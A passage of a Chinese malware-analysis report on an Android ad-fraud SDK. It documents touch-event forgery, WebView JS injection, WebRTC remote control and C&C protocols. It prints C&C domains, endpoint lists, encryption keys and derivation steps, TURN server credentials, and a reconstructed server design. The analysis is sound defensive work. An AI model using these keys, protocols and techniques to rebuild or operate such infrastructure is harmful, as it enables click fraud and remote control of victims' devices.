**还原路径**: `restored_java/touch/`

这些类实现了高度仿真的触摸事件伪造系统和完整的 WebView 自动化引擎，包含任务编排、信令/非信令双模式任务实现。

#### 文件清单与类名映射

| 还原文件名 | 原始混淆类名 | 行数 | 功能说明 |
|-----------|-------------|------|---------|
| `MotionHelper.java` | `com.nied.MotionHelper` | 917 | 触摸事件伪造核心：构造包含贝塞尔曲线轨迹、四段压力分布、9轴传感器数据的 MotionEvent 序列 |
| `RandomHelper.java` | `com.nied.RandomHelper` | 98 | 高精度随机数工具：支持 10^14~10^17 精度的随机浮点，确保压力/坐标值不重复 |
| `SwipeSimulator.java` | `lIllIlIll1.lIIIIlllllIlll1` | 189 | 贝塞尔曲线滑动模拟器：使用 AccelerateDecelerateInterpolator + Path.quadTo() 生成自然滑动手势 |
| `WebViewBridge.java` | `lIllIlIll1.IlIllIlllIllI1` | 138 | JavaScript Bridge 接口：定义 16 个 @JavascriptInterface 方法 (touch/scroll/screenshot/done/upload_event 等) |
| `WebViewAutomationBase.java` | `lIllIlIll1.llllIIIIll1` | 1,475 | WebView 自动化基类：WebSettings 全权限配置、JS 注入、请求拦截/代理、触摸分发、事件上报、反取证清理 |
| `TaskOrchestrator.java` | `lIllIlIll1.IlIlllIIlI1` | 532 | 任务编排器：C&C 认证、JS 下载/缓存、信令/非信令模式分发、WebView 创建、任务重启循环 |
| `SignalingModeTask.java` | `lIllIlIll1.IllIIlIIII1` | 271 | 信令模式任务：extends WebViewAutomationBase，创建 WebRTCController、上报信令状态、通过 WebRTC 截屏 |
| `NonSignalingModeTask.java` | `lIllIlIll1.llllIllIl1` | 146 | 非信令模式任务：extends WebViewAutomationBase，本地截屏、任务完成后自动重启下一轮循环 |
| `SDKInitializer.java` | `com.nied.lduvv.Kucopd` | 51 | SDK 入口点：后台线程启动 WebView 自动化管道 |

#### MotionHelper.java 还原要点

- **JADX 反编译失败方法重建**: `getRandomScrollMotionEvents()` (原始 686 条 Dalvik 指令) 因过于复杂导致 JADX 反编译失败。基于调用上下文、参数类型、返回值和相关方法的逻辑，手动重建了完整实现
- **AndroidX 常量解引用**: `InputDeviceCompat.SOURCE_TOUCHSCREEN` → `0x1002`，`PathInterpolatorCompat.MAX_NUM_POINTS` → `3000`，`AccessibilityNodeInfoCompat.EXTRA_DATA_TEXT_CHARACTER_LOCATION_ARG_MAX_LENGTH` → `20000`
- **30+ 方法**完整保留：`clickViewExact`、`clickViewByPoint`、`getScrollMotionEventPoints` (贝塞尔采样)、`getRandomPressure` (四段分布)、`getPointerCoords` (9轴模拟)、`sendMotionEvent` (分发器) 等

#### SwipeSimulator.java 还原要点

| 原始混淆名 | 还原名称 | 类型 | 说明 |
|-----------|----------|------|------|
| `f485llllIIIIll1` | `webView` | WebView | 目标 WebView |
| `f484lIIIIlllllIlll1` | `startPoint` | PointF | 滑动起点 |
| `f486llllIllIl1` | `endPoint` | PointF | 滑动终点 |
| `f482IlIlllIIlI1` | `controlPoint` | PointF | 贝塞尔控制点 (随机计算) |
| `f483IllIIlIIII1` | `duration` | long | 滑动持续时间 (ms) |
| `f487llllllIlIIIlll1` | `isRunning` | boolean | 运行状态标志 |
| 内部类 `llllIIIIll1` | `DispatchTouchRunnable` | Runnable | 主线程触摸事件分发器 |

解密的 XOR 字符串：`"dispatchTouchEvent occur error: "`、`"[times]:"`, `" [duration]:"`, `"[pos]:"`, `" x "`, `", flag:"`, `", distance: "`

#### WebViewAutomationBase.java 还原要点

这是整个恶意 SDK 中最复杂的单一类文件 (原始 789 行混淆代码 → 1,475 行还原代码)。

**字段还原** (15 个):

| 原始混淆名 | 还原名称 | 类型 | 说明 |
|-----------|----------|------|------|
| `f493lllIlIIIlI1` | `INJECTED_JS_SCRIPT` | static String | XOR 加密的 JavaScript 注入脚本 (数千字节) |
| `f508llllIIIIll1` | `webView` | WebView | 目标 WebView 实例 |
| `f503lIIIIlllllIlll1` | `configJson` | JSONObject | C&C 下发的任务配置 |
| `f502IllIIlIIII1` | `jsBridgeName` | String | JS Bridge 名称 (解密值: `"Android"`) |
| `f498IlIlIIlIII1` | `taskConfig` | TaskConfig | 任务配置对象 |
| `f496IlIIlllllI1` | `pendingEvents` | List\<String\> | 待上传事件队列 |
| `f510lllllIllIl1` | `pendingLogs` | List\<String\> | 待上传日志队列 |
| `f506llIIIIlIlllIII1` | `uploadTimer` | Timer | 定时上传 Timer (每 4 秒) |
| `f501IlIllll1` | `currentSwipe` | SwipeSimulator | 当前活跃的滑动模拟 |
| `f504lIllIIIlIl1` | `interceptEnabled` | boolean | 请求拦截开关 |
| `f499IlIllIlllIllI1` | `elapsedTime` | long | 累计执行时间 |
| `f500IlIlllIIlI1` | `pageStartTime` | long | 页面加载开始时间 |
| `f505lIllIlIll1` | `tickCounter` | long | 上传计数器 |
| `f497IlIlIIIlIlIlll1` | `isFirstRun` | boolean | 首次运行标志 |
| `f511llllllIlIIIlll1` | `loadedUrls` | HashSet\<String\> | 已加载 URL 集合 |

**内部类还原** (9 个):

| 原始混淆名 | 还原名称 | 基类 | 功能 |
|-----------|----------|------|------|
| `IlIlIIlIII1` | `CleanupRunnable` | Runnable | 移除 JS Bridge 接口并销毁 WebView |
| `IlIllIlllIllI1` | `InjectScriptRunnable` | Runnable | 通过 `evaluateJavascript()` 注入 JS 脚本 |
| `IllIIlIIII1` | `CustomChromeClient` | WebChromeClient | 静默吞没 console 输出，追踪加载进度 |
| `lIIIIlllllIlll1` | `StartUploadRunnable` | Runnable | 启动事件/日志上传定时器 |
| `lIllIIIlIl1` | `TimerCancelRunnable` | Runnable | 60 秒后取消上传 Timer |
| `C0019llllIIIIll1` | `NoOpCallback` | Callback | 空回调实现 |
| `llllIllIl1` | `UploadTimerTask` | TimerTask | 每 4 秒批量上传事件/日志至 C&C |
| `llllllIlIIIlll1` | `TouchRunnable` | Runnable | 在指定坐标分发触摸事件 |
| `IlIlllIIlI1` | `CustomWebViewClient` | WebViewClient | 请求拦截、JS 注入、本地文件服务 |

**关键解密字符串** (58 个，部分示例):

| 上下文 | 解密结果 | 用途 |
|--------|----------|------|
| 构造函数 | `"Android"` | JS Bridge 注册名称 |
| 构造函数 | `"offer"` | 任务配置 JSON 键 |
| 构造函数 | `"sdk_iframe_access"` | 请求拦截开关配置键 |
| InjectScriptRunnable | `"注入js"` | 日志：注入 JavaScript |
| InjectScriptRunnable | `"javascript:void((function(){var s=..."` | JS 注入模板前缀 |
| UploadTimerTask | `"start upload events"` | 事件上传日志 |
| UploadTimerTask | `"start upload logs"` | 日志上传日志 |
| CustomWebViewClient | `".*\\(cdn\|static\\).*\\.[mc]?js\\b"` | CDN/静态 JS 文件拦截正则 |
| CustomWebViewClient | `"User-Agent"` | HTTP 请求头名称 |
| serveLocalFile | `"sdk/"` | 本地 AI 模型文件路径前缀 |
| serveLocalFile | `"返回本地AI模型文件: "` | 日志：返回本地 AI 模型 |
| serveLocalFile | `"AI模型文件不存在: "` | 日志：AI 模型文件不存在 |
| clearBrowserData | `"=======clear=======clear=======clear======"` | 反取证清理日志 |
| onFirstPageLoad | `"last_show_time"` | SharedPreferences 键名 |

**INJECTED_JS_SCRIPT 静态字段**：这是一个巨大的 XOR 加密字节数组 (行 53-60，数千字节)，解密后为完整的 JavaScript 脚本，功能包括：
- 创建 `postMessage` / `onmessage` 通信桥接
- XPath 表达式求值器，定位页面元素并返回边界矩形
- 原生 `postMessage` 函数伪装 (重写 `toString`、`valueOf`、`name`、`length` 属性使其看起来像原生实现)

#### TaskOrchestrator.java 还原要点

中央任务编排器，原始 303 行混淆代码 → 532 行还原代码，含 44 个 XOR 加密字符串。

**静态常量还原** (4 个，在 static 初始化块中 XOR 解密):

| 原始字段 | 还原名称 | 解密值 | 用途 |
|----------|----------|--------|------|
| `f462IllIIlIIII1` | `SIGNALING_JS_FILE_KEY` | `"eiedo/s_pfile"` | 信令 JS 文件缓存键 |
| `f463lIIIIlllllIlll1` | `JS_VERSION_KEY_ALT` | `"JS_VERSION"` | JS 版本检查键 (备用) |
| `f464llllIIIIll1` | `JS_VERSION_KEY` | `"JS_VERSION"` | SharedPreferences 版本缓存键 |
| `f465llllIllIl1` | `NON_SIGNALING_JS_FILE_KEY` | `"eiedo/pfile"` | 非信令 JS 文件缓存键 |

**内部类还原** (4 个):

| 原始混淆名 | 还原名称 | 基类 | 功能 |
|-----------|----------|------|------|
| `lIIIIlllllIlll1` | `CreateWebViewRunnable` | Runnable | UI 线程创建 WebView 实例 |
| `llllIIIIll1` | `TaskExecutionRunnable` | Runnable | 主任务执行：认证→下载JS→创建任务实例 |
| `llllIIIIll1.lIIIIlllllIlll1` | `InitWebViewRunnable` | Runnable | UI 线程调用 initializeWebView() |
| `RunnableC0018llllIIIIll1` | `RestartRunnable` | Runnable | 触发任务重启循环 |

**关键解密字符串**:
- 构造函数: `"ZDgyNjEhKDk1RjBjYzExZUVAODE5XzUyNDA4QmEyNWI="` (WebView 数据目录后缀 Base64 编码)
- 认证: `"getToken"`, `"get token API error: "`
- 任务执行: `"start task"`, `"get task: "`, `"start task failed: "`
- JS 下载: `"checkSignalingJsVersion start"`, `"checkJsVersion start"`, `"signaling token: "`
- 文件操作: `"写入JS文件失败"`, `"js is empty"`, `"read signaling JS from cache error: "`
- 重启: `"H5V1Refactor task start (restart)"`

#### SignalingModeTask.java 还原要点

信令模式任务实现 (extends WebViewAutomationBase)，147 行 → 271 行，含 8 个 XOR 字符串。

| 原始字段 | 还原名称 | 说明 |
|----------|----------|------|
| `f473lIIlIIIIlIlII1` | `inLandingReported` | IN_LANDING 状态上报标志 |
| `f474lIlllIIIII1` | `webRTCController` | WebRTCController 实例 |
| 内部类 `lIIIIlllllIlll1` | `GetUrlRunnable` | UI 线程获取当前 URL |
| 内部类 `llllIIIIll1` | `SignalingCleanupRunnable` | 清理时同时停止 WebRTCController |
| 内部类 `llllIllIl1` | `StatusUpdateCallback` | 状态上报回调 |

关键行为: `isMainPageLoaded()` 返回 `!inLandingReported` — 在 IN_LANDING 状态上报成功前阻止 JS 注入。

#### NonSignalingModeTask.java 还原要点

非信令模式任务实现 (extends WebViewAutomationBase)，73 行 → 146 行，含 1 个 XOR 字符串。

| 原始字段 | 还原名称 | 说明 |
|----------|----------|------|
| `f524lIIlIIIIlIlII1` | `restartCallback` | 任务完成后重启回调 |
| `f525lIlllIIIII1` | `screenshotter` | 本地 Bitmap 截屏器 |
| 内部类 `llllIIIIll1` | `EmptyScreenshotCallback` | 空截图回调 |

关键行为: `cleanup()` 调用 `super.cleanup()` 后 sleep 1 秒，然后触发 `restartCallback.run()` 开始下一轮任务循环。

---

### 13.5 C&C 通信协议还原 (17 文件)

输出目录: `restored_java/c2/`

对 `c13/nim5/ez8/h5_proto/` 包中的 17 个 C&C 通信协议类进行了完整还原，累计解密 **354 处** XOR 加密字符串。

#### 核心通信类

| 还原文件 | 原始混淆文件 | 行数 | XOR 字符串 | 说明 |
|---------|-------------|------|-----------|------|
| `HttpGatewayClient.java` | `HttpGatewayClient.java` | 452 | 39 | **核心 C2 HTTP 客户端** — 五层加密管道 (JSON→GZIP→Base64→AES-256-CFB→Base64) |
| `DllpgdLiteSDK.java` | `DllpgdLiteSDK.java` | 121 | 37 | SDK 入口单例 — C2 域名 `dllpgd.click`，含样本数据构建辅助方法 |
| `DllpgdConfig.java` | `DllpgdConfig.java` | 139 | 24 | C2 配置载荷 — 插件列表、会话 ID、反分析 Hook 检测栈轨迹 |
| `H5Lite.java` | `H5Lite.java` | 32 | 1 | 轻量 SDK 门面 — 封装事件/日志上报接口 |

#### 数据模型类

| 还原文件 | 原始混淆文件 | 行数 | XOR 字符串 | 说明 |
|---------|-------------|------|-----------|------|
| `Atom.java` | `Atom.java` | 153 | 51 | **核心设备指纹** — 10 字段: deviceId, deviceInfo, version, appPackageName, appVersion, gaId, sessionId, appChannel, pluginInfos, isGeneratedBySubProcess |
| `PluginInfo.java` | `PluginInfo.java` | 189 | 76 | **远程插件描述** — 15 字段: id, name, url, md5, className, needRun, needUpdate, delayRunSeconds, lastVersion, password, pluginStatus, endDelete, autoStartOnInit, startIndex, runInSubProcess |
| `Log.java` | `Log.java` | 138 | 29 | 日志条目 — 含 LogLevel 枚举 (JADX 反编译失败，手动重建) |
| `DeviceInfo.java` | `DeviceInfo.java` | 78 | 24 | 设备硬件信息 — timezone, locale, phoneTimestamp, phoneModel, androidVersion |
| `LocalPluginInfo.java` | `LocalPluginInfo.java` | 78 | 25 | 本地插件缓存元数据 — name, version, lastUpdateTime, pluginStatus, className |
| `Event.java` | `Event.java` | 63 | 16 | 遥测事件 — timestamp, name, desc |
| `Vector2.java` | `Vector2.java` | 48 | 10 | 2D 坐标 — x, y |

#### 请求/响应包装类

| 还原文件 | 原始混淆文件 | 行数 | XOR 字符串 | 说明 |
|---------|-------------|------|-----------|------|
| `CommonRequest.java` | `CommonRequest.java` | 42 | 6 | 通用请求包装 — 包含 atom 字段 |
| `CommonResponse.java` | `CommonResponse.java` | 48 | 11 | 通用响应 — code + message |
| `GetConfigResponse.java` | `GetConfigResponse.java` | 61 | 16 | 配置响应 — code + message + dllpgdConfig |
| `UpdateEventRequest.java` | `UpdateEventRequest.java` | 64 | 11 | 事件上报请求 — atom + events 列表 |
| `UpdateLogRequest.java` | `UpdateLogRequest.java` | 64 | 11 | 日志上报请求 — atom + log 列表 |

#### 工具类

| 还原文件 | 原始混淆文件 | 行数 | XOR 字符串 | 说明 |
|---------|-------------|------|-----------|------|
| `JsonObjectUtils.java` | `JsonObjectUtils.java` | 157 | 2 | 反射式 JSON 序列化/反序列化工具 — 自动映射对象字段 |

#### HttpGatewayClient 关键还原细节

**五层加密管道** (每个 API 请求):
```
发送: JSON.toString() → UTF-8 → GZIP压缩 → Base64编码 → AES-256-CFB加密 → Base64编码 → HTTP POST
```

**AES 密钥派生**:
```
密钥种子: "GreenDay"
派生过程: MD5("GreenDay") → 大写十六进制字符串 → UTF-8字节 → 截取/填充至32字节
加密算法: AES/CFB/NoPadding
IV: 随机16字节，前置于密文
Base64 标志: NO_WRAP (flag=2)
```

**三个 API 端点**:
| 端点路径 | 方法 | 功能 |
|---------|------|------|
| `/api/v1/dllpgd/getConfig` | `getConfig()` | 获取配置 (插件列表 + 反分析参数) |
| `/api/v1/dllpgd/updateEvent` | `updateEvent()` | 上报遥测事件 |
| `/api/v1/dllpgd/updateLog` | `updateLog()` | 上传日志条目 |

**HTTP 请求头**:
- `Content-Type: application/json`
- `User-Agent: DllpgdLiteClient/2.0`
- 连接超时: 10 秒，读取超时: 30 秒

**aesDecryptString() 方法重建**: JADX 反编译完全失败，输出为原始字节码。基于 bytecode 指令手动重建了完整的解密逻辑: Base64 解码 → 提取 IV (前16字节) → AES-CFB 解密 → UTF-8 字符串。

---

### 13.6 依赖模块还原 (19 文件)

对 touch/c2/signaling 模块中引用的核心依赖类进行了完整还原，覆盖 core/api/model 三个子模块。第二轮还原补全了 5 个大型依赖文件（PreferencesHelper, HttpClient, RequestFilter, SignalingConnection, WebRTCController），累计解密 **508 处**新增 XOR 加密字符串。

**core/ — 核心工具类 (7 文件)**

| 文件 | 原始类名 | 行数 | 说明 |
|------|---------|------|------|
| `ScreenshotCallback.java` | `IIIlIllIlI1.IlIlllIIlI1` | 20 | 截图回调接口 |
| `WebViewLifecycleCallback.java` | `IIIlIllIlI1.llllllIlIIIlll1` | 32 | WebView 生命周期回调 (ready/destroyed/error) |
| `Size.java` | `IlIIlllllI1.llllIIIIll1` | 35 | 屏幕尺寸类 (width, height) |
| `ScreenHelper.java` | `IlIlIIIlIlIlll1.lIllIIIlIl1` | 51 | 屏幕尺寸获取，支持 API 30+ WindowMetrics |
| `LogHelper.java` | `lllllIllIl1.IllIIlIIII1` | 165 | 日志工具，tag=`[Dllpgd][HR]`，支持 C&C 上传+Android Log |
| `PreferencesHelper.java` | `IlIlIIIlIlIlll1.IIlIllIIll1` | 573 | **SharedPreferences/AES加密/AI模型下载**，文件名=`jsbi_h5o`，AES密钥=`ZDgyNjEhKDk1RjBjYzExZUVAODE5XzUyNDA4QmEyNWI=` |
| `RequestFilter.java` | `IIIlIllIlI1.lIllIIIlIl1` | 399 | **WebView请求拦截**，通过Chromium反射API拦截URL，JS桥消息协议(i-req/i-arg/i-ans/m-req/m-ask/m-fin) |

**api/ — API 客户端 (3 文件)**

| 文件 | 原始类名 | 行数 | 说明 |
|------|---------|------|------|
| `ApiException.java` | `IIlIllIIll1.llllIIIIll1` | 86 | API 异常类，从 smali 手动重建构造函数，错误格式：`API响应失败[{name}]: code={code}` |
| `ApiClient.java` | `IlIllIlllIllI1.llllIIIIll1` | 318 | C&C API 客户端，9个端点，基础URL：`https://playstations.click` |
| `HttpClient.java` | `IlIllIlllIllI1.lIIIIlllllIlll1` | 368 | **HTTP传输层**，支持XOR+Base64加密请求/响应，15秒超时，4种HTTP方法 |

**C&C API 端点表 (从 ApiClient 解密)**

| 端点路径 | 方法名 | 功能 |
|---------|--------|------|
| `/phantom/token` | `getToken()` | 设备认证获取令牌 |
| `/phantom/task` | `getTaskConfig()` | 获取非信令任务配置 |
| `/phantom/file_version` | `getFileVersion()` | 查询JS文件版本 |
| `/phantom/file` | `getFileContent()` | 下载JS注入脚本 |
| `/phantom/done` | `reportDone()` | 报告任务完成 |
| `/h5/upload_logs_v2` | `uploadLogs()` | 批量上传日志 |
| `/h5/js_file_for_signaling` | `getSignalingJS()` | 获取信令JS文件 |
| `/h5/get_job_by_offer` | `getJobByOffer()` | 按 offer 获取任务 |
| `/h5/report_events` | `reportEvents()` | 批量上报事件 |

**model/ — 数据模型 (7 文件)**

| 文件 | 原始类名 | 行数 | 说明 |
|------|---------|------|------|
| `Jsonable.java` | `lIllIIIlIl1.IlIllll1` | 15 | JSON 序列化接口 |
| `TokenResponse.java` | `lIllIIIlIl1.IlIlllIIlI1` | 65 | Token 响应 (code, message, content) |
| `FileVersionResponse.java` | `lIllIIIlIl1.IllIIlIIII1` | 56 | 文件版本响应 (code, message, version) |
| `FileContentResponse.java` | `lIllIIIlIl1.lIllIlIll1` | 57 | 文件内容响应 (code, message, task) |
| `Offer.java` | `lIllIIIlIl1.llIIIIlIlllIII1` | 96 | 广告任务配置 (site_url, job_id, offer_id) |
| `DeviceAuthRequest.java` | `lIllIIIlIl1.lIIIIlllllIlll1` | 87 | 设备认证请求 (app_id, device_id, token, atom) |
| `DeviceFingerprint.java` | `lIllIIIlIl1.llllIIIIll1` | 193 | 设备指纹 — 15字段全采集 (channel=`tc`) |

**signaling/ — 信令与WebRTC (新增 2 文件)**

| 文件 | 原始类名 | 行数 | 说明 |
|------|---------|------|------|
| `SignalingConnection.java` | `IlIlIIlIII1.lIIIIlllllIlll1` | 420 | **WebRTC信令连接**，WebSocket管理，SDP/ICE交换，ping机制，远程控制命令(click/scroll/text) |
| `WebRTCController.java` | `llIIIIlIlllIII1.IllIIlIIII1` | ~1,100 | **WebRTC远程控制器**(最大文件)，PeerConnection生命周期，DataChannel命令处理，触摸/键盘模拟，JS注入，视频流(15fps)，TURN凭据 |

#### 第二轮还原关键发现

| 发现 | 详情 |
|------|------|
| **TURN服务器凭据** | `turn:101.36.120.3:3478` 和 `turn:106.75.153.105:3478`，用户名 `wumitech`，密码 `wumitech.com@123` |
| **AES加密密钥** | `ZDgyNjEhKDk1RjBjYzExZUVAODE5XzUyNDA4QmEyNWI=` (Base64)，用于本地文件加密 |
| **AI模型CDN** | `app-download.cn-wlcb.ufileos.com/dllpgd_plugin/ai_model/`，TFLite模型+JS模型分片 |
| **SharedPreferences** | 文件名=`jsbi_h5o`，存储UUID、JS模型版本、首次初始化标记 |
| **广告网络来源** | `*.doubleclick.net`、`*.googlesyndication.com`、`syndicatedsearch.goog` (请求拦截目标) |
| **JS桥消息协议** | 类型: `i-req`/`i-arg`/`i-ans`/`m-req`/`m-ask`/`m-fin`/`stop`，JSON键: `type`/`msg`/`id` |
| **远程控制命令** | DataChannel命令: `click`/`drag`/`dragEnd`/`scroll`/`paste`/`input`/`inputAt`/`keyInput`/`goBack`/`close`/`release` |
| **EglBase反射** | 3种回退策略创建EGL上下文: `EglBase$-CC`、`EglBase$CC`、`EglBase` |
| **原生库回退** | 先尝试标准加载，失败后手动 `System.loadLibrary("jingle_peerconnection_so")` |

---

### 13.7 辅助工具

| 工具文件 | 路径 | 用途 |
|---------|------|------|
| `decrypt_all_strings.py` | `根目录` | 批量 XOR 解密器 — 提取信令/WebRTC 文件中所有加密调用并解密 |
| `decrypt_touch_strings.py` | `根目录` | 触摸模块 XOR 解密器 — 提取 SwipeSimulator/WebViewAutomationBase/SDKInitializer 中的加密字符串 |
| `decrypt_xor_strings.py` | `根目录` | WebView 自动化模块 XOR 解密器 — 提取 TaskOrchestrator/SignalingModeTask/NonSignalingModeTask 中的加密字符串 |
| `decrypt_c2_strings.py` | `根目录` | C&C 通信协议 XOR 解密器 — 提取 c13/nim5/ez8/h5_proto/ 包 17 个文件中的 354 处加密字符串 |

#### 解密器工作原理

```python
def xor_decrypt(cipher_bytes, key_bytes):
    result = bytearray(len(cipher_bytes))
    for i in range(len(cipher_bytes)):
        result[i] = (cipher_bytes[i] & 0xFF) ^ (key_bytes[i % len(key_bytes)] & 0xFF)
    return result.decode('utf-8')
```

通过正则表达式 `llllIIIIll1\(new byte\[\]\{...\}, new byte\[\]\{...\}\)` 匹配源码中的所有 XOR 解密调用，自动提取密文和密钥字节数组并执行解密。累计解密 **1,540+ 处**加密字符串调用。

## 十四、服务端架构还原分析

> 注：由于没有服务端源码，以下架构完全从客户端代码逆向推导。

### 14.1 服务端组件总览

该恶意软件的完整后端基础设施由 **四类服务器** 组成，分别承担不同角色：

```
┌─────────────────────────────────────────────────────────────────────────┐
│                        服务端基础设施全景                                 │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  ┌───────────────────────┐    ┌───────────────────────┐                │
│  │  ① C&C 配置服务器       │    │  ② C&C API 服务器       │                │
│  │  dllpgd.click          │    │  playstations.click    │                │
│  │  (Spring Boot / Java)  │    │  (未知框架)              │                │
│  │  AWS EC2 us-east-1     │    │  XOR+Base64 加密通信    │                │
│  │  AES-256-CFB 加密通信   │    │                        │                │
│  └───────────┬───────────┘    └───────────┬───────────┘                │
│              │                            │                             │
│     设备注册/配置下发/日志收集       认证/任务分发/JS下发/事件上报            │
│              │                            │                             │
│  ┌───────────┴────────────────────────────┴───────────┐                │
│  │              被感染手机 (nova2 SDK)                    │                │
│  └───────────┬────────────────────────────┬───────────┘                │
│              │                            │                             │
│     WebSocket 信令                  WebRTC 媒体/数据                     │
│              │                            │                             │
│  ┌───────────┴───────────┐    ┌───────────┴───────────┐                │
│  │  ③ 信令服务器           │    │  ④ TURN 中继服务器       │                │
│  │  (WebSocket/gRPC)      │    │  101.36.120.3:3478    │                │
│  │  C&C 动态下发 URL       │    │  106.75.153.105:3478  │                │
│  │  SDP/ICE 中转           │    │  UCloud (香港/上海)    │                │
│  └───────────────────────┘    │  用户: wumitech        │                │
│                                │  密码: wumitech.com@123│                │
│  ┌───────────────────────┐    └───────────────────────┘                │
│  │  ⑤ CDN 文件服务器       │                                             │
│  │  UCloud UFile OSS      │                                             │
│  │  app-download.cn-wlcb  │                                             │
│  │  .ufileos.com          │                                             │
│  │  AI模型/JS脚本分发       │                                             │
│  └───────────────────────┘                                             │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### 14.2 服务器 ①：C&C 配置服务器 (dllpgd.click)

#### 推断技术栈

| 属性 | 值 | 推断依据 |
|------|---|---------|
| **域名** | `dllpgd.click` | XOR 解密 DllpgdLiteSDK 常量 |
| **框架** | Spring Boot (Java) | HTTP 探测返回 Whitelabel Error Page |
| **部署** | AWS EC2 (us-east-1) | DNS: 18.204.68.18, 18.206.233.238 |
| **协议** | HTTP (80 端口) | HTTPS (443) 连接拒绝 |
| **加密** | AES-256-CFB (5 层管道) | HttpGatewayClient 代码分析 |
| **认证** | User-Agent: `DllpgdLiteClient/2.0` | XOR 解密 HTTP 头 |
| **当前状态** | 存活但 API 已下线 (404) | 实测验证 |

#### 必须实现的 API 端点

```
Spring Boot Application
├── Controller Layer
│   ├── POST /api/v1/dllpgd/getConfig
│   │   ├── 接收: AES-256-CFB 加密的 {atom: Atom} 请求
│   │   ├── 解密: Base64→AES→Base64→GZIP→JSON
│   │   ├── 处理: 查询设备配置 + 插件列表
│   │   └── 返回: GetConfigResponse {code, message, dllpgdConfig}
│   │            dllpgdConfig: {plugins[], sessionId, hookPkgNameStackTraces[],
│   │                          hookPackageManagerStackTraces[], fixPackageName}
│   │
│   ├── POST /api/v1/dllpgd/updateEvent
│   │   ├── 接收: 加密的 {atom, events[]} 请求
│   │   ├── events[]: [{timestamp, name, desc}, ...]
│   │   └── 返回: CommonResponse {code, message}
│   │
│   └── POST /api/v1/dllpgd/updateLog
│       ├── 接收: 加密的 {atom, log[]} 请求
│       ├── log[]: [{timestamp, level, tag, message}, ...]
│       └── 返回: CommonResponse {code, message}
│
├── Encryption Layer (AES-256-CFB)
│   ├── 密钥: MD5("GreenDay").toUpperCase() = "66987CE7134F63EF7EE6F5024AD312B3"
│   ├── 模式: AES/CFB/NoPadding
│   ├── IV: 随机 16 字节，前置于密文
│   └── 管道: Base64 decode → AES decrypt → Base64 decode → GZIP decompress → JSON parse
│
├── Database Layer
│   ├── devices 表: 设备指纹存储 (deviceId, deviceInfo, appPackageName, gaId, ...)
│   ├── plugins 表: 远程插件管理 (url, md5, className, password, needRun, ...)
│   ├── events 表: 遥测事件存储
│   ├── logs 表: 日志存储
│   └── sessions 表: 会话管理
│
└── Plugin Management
    ├── 插件 .dex 文件托管
    ├── AES-ECB 加密打包
    ├── MD5 校验码计算
    └── 版本管理 + 按设备灰度下发
```

#### 请求/响应加解密流程

```
客户端发送:
  Atom JSON → UTF-8 bytes → GZIP → Base64(NO_WRAP) → AES-256-CFB(随机IV) → Base64(NO_WRAP) → HTTP POST body

服务端接收:
  HTTP POST body → Base64 decode → AES-256-CFB decrypt(提取前16字节IV) → Base64 decode → GZIP decompress → JSON parse → Atom

服务端响应 (逆向):
  Response JSON → UTF-8 bytes → GZIP → Base64 → AES-256-CFB(随机IV) → Base64 → HTTP Response body

客户端解密:
  HTTP Response body → Base64 decode → AES decrypt → Base64 decode → GZIP decompress → JSON parse → GetConfigResponse
```

### 14.3 服务器 ②：C&C API 服务器 (playstations.click)

#### 推断技术栈

| 属性 | 值 | 推断依据 |
|------|---|---------|
| **域名** | `playstations.click` | ApiClient.BASE_URL 常量 |
| **协议** | HTTPS | URL 前缀 `https://` |
| **加密** | XOR+Base64 (HttpClient 层) | HttpClient.encryptionKey 动态设置 |
| **认证** | Token-based | /phantom/token 返回 auth token |
| **User-Agent** | 动态构建 | PreferencesHelper.buildUserAgent() |

#### 必须实现的 API 端点

```
API Server Application
├── /phantom/ — 核心控制接口
│   │
│   ├── POST /phantom/token                 ← 设备认证
│   │   ├── 请求: DeviceAuthRequest {app_id, device_id, token, atom}
│   │   │         atom: DeviceFingerprint (15字段)
│   │   ├── 处理: 验证设备身份 → 生成/刷新 auth token
│   │   ├── 处理: 下发 XOR 加密密钥 (encryptionKey)
│   │   └── 响应: TokenResponse {code, message, content(=token)}
│   │
│   ├── POST /phantom/task                  ← 任务配置获取
│   │   ├── 请求: DeviceAuthRequest (含 token)
│   │   ├── 处理: 根据设备指纹匹配广告任务
│   │   └── 响应: FileContentResponse {code, message, task(=JS配置JSON)}
│   │
│   ├── POST /phantom/file_version          ← JS 文件版本查询
│   │   ├── 请求: DeviceAuthRequest
│   │   ├── 处理: 查询当前 JS 注入脚本版本号
│   │   └── 响应: FileVersionResponse {code, message, version}
│   │
│   ├── POST /phantom/file                  ← JS 文件内容下载
│   │   ├── 请求: DeviceAuthRequest
│   │   ├── 处理: 返回完整 JS 注入脚本内容
│   │   └── 响应: TokenResponse {code, message, content(=JS代码)}
│   │
│   └── POST /phantom/done                  ← 任务完成报告
│       ├── 请求: DoneRequest {app_id, device_id, token, apiKey, offerId, result, atom}
│       ├── 处理: 记录任务完成状态 → 计费/统计
│       └── 响应: 空 (无返回体)
│
├── /h5/ — H5 信令与事件接口
│   │
│   ├── POST /h5/js_file_for_signaling      ← 信令 JS 获取
│   │   ├── 请求: SignalingJSRequest {offerStr, token, app_id, device_id, platform("tc"), atom}
│   │   ├── 处理: 根据 offer 返回信令模式专用 JS
│   │   └── 响应: JSON (JS 文件内容)
│   │
│   ├── POST /h5/get_job_by_offer           ← 按 offer 获取 job
│   │   ├── 请求: JobByOfferRequest {apiKey, offerId, token, app_id, device_id, platform, atom}
│   │   ├── 处理: 查找 offer 关联的任务 → 返回 site_url + 信令配置
│   │   ├── 响应: FileContentResponse {code, message, task}
│   │   │         task 包含: site_url, job_id, offer_id
│   │   └── 响应额外字段 (推断): ws_url, stun_url, turn_url, turn_username, turn_credential
│   │
│   ├── POST /h5/upload_logs_v2             ← 批量日志上传
│   │   ├── 请求: LogUploadRequest {token, app_id, device_id, platform, apiKey, offerId, events[], atom}
│   │   ├── 处理: 存储日志记录
│   │   └── 响应: 空
│   │
│   └── POST /h5/report_events              ← 批量事件上报
│       ├── 请求: EventReportRequest {token, app_id, device_id, platform, apiKey, offerId, events[], atom}
│       ├── 处理: 存储遥测事件
│       └── 响应: 空
│
├── Encryption Layer (XOR + Base64)
│   ├── 加密密钥: 服务端在 /phantom/token 响应中动态下发
│   ├── 请求加密: JSON bytes → XOR(key) → Base64 → 发送
│   ├── 响应加密: Base64 decode → XOR(key) → JSON parse
│   └── 密钥为空时: 明文 JSON 传输
│
├── 任务调度系统
│   ├── Offer 管理: 广告任务配置 (site_url, job_id, offer_id)
